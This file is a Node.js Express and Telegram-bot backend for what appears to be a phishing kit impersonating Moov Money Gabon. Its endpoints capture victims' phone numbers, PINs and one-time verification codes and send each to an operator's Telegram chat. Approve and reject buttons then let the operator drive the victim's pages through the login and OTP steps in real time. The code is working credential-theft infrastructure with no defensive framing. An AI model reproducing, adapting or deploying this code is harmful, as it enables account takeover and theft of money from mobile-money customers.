const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Gabon";
    const countryCode = "+241";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending";

    const message = `📱 <b>MOOV MONEY GABON - LOGIN ATTEMPT</b>

🆕 <b>NEW USER</b>
🇬🇦 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> <code>${phone}</code>
🔢 <b>PIN:</b> <code>${pin}</code>
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>User waiting for approval</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Allow & Go to OTP", callback_data: `approve|${phone}|${pin}` },
                        { text: "❌ Wrong PIN", callback_data: `deny|${phone}|${pin}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error("Telegram Error (Login):", err.message);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- FIRST OTP API --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, code } = req.body || {};
    const country = "Gabon";
    const countryCode = "+241";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !code || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_otp1";

    const otpMessage = `🔑 <b>MOOV MONEY GABON - VERIFICATION NEEDED</b>
🇬🇦 <b>Country:</b> ${country}
📞 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> <code>${phone}</code>
🔑 <b>VERIFICATION CODE:</b> <code>${code}</code>
⏰ <b>Time:</b> ${currentTime}

<b>━━━━━━━━━━━━━━━━━</b>

⚠️ <b>Verify the credentials:</b>
⏰ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            disable_web_page_preview: true,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct (Show Page 9)", callback_data: `otp1_correct|${phone}` }
                    ],
                    [
                        { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` },
                        { text: "⚠️ Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error("Telegram Error (OTP):", err.message);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- BOT ACTIONS --------------------

bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "approved";
    try {
        await ctx.answerCbQuery("Allowed");
        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`✅ <b>Login Approved for ${phone}</b>`);
    } catch (e) {}
});

bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrongpin";
    try {
        await ctx.answerCbQuery("Wrong PIN");
        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`❌ <b>Wrong PIN reported for ${phone}</b>`);
    } catch (e) {}
});

bot.action(/^otp1_correct\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_correct";
    try {
        await ctx.answerCbQuery("Verified");
        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`✅ <b>OTP Verified. Redirecting user to success page.</b>`);
    } catch (e) {}
});

bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_wrong";
    try {
        await ctx.answerCbQuery("Wrong Code");
        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`❌ <b>Wrong OTP code for ${phone}</b>`);
    } catch (e) {}
});

bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrongpin";
    try {
        await ctx.answerCbQuery("Wrong PIN");
        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`🔑 <b>Wrong PIN reported for ${phone}</b>`);
    } catch (e) {}
});

// Global error handler to keep bot online
bot.catch((err, ctx) => {
    console.error(`⚠️ Telegram Bot Error for ${ctx.updateType}:`, err);
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    const currentStatus = statusStore[phone] || "pending";
    res.json({ status: currentStatus });
});

app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();
    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- START SERVER & BOT --------------------
app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        bot.launch();
        console.log("🤖 Telegram Bot is online and listening 24/7");
    } catch (err) {
        console.error("❌ Bot launch error:", err);
    }
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
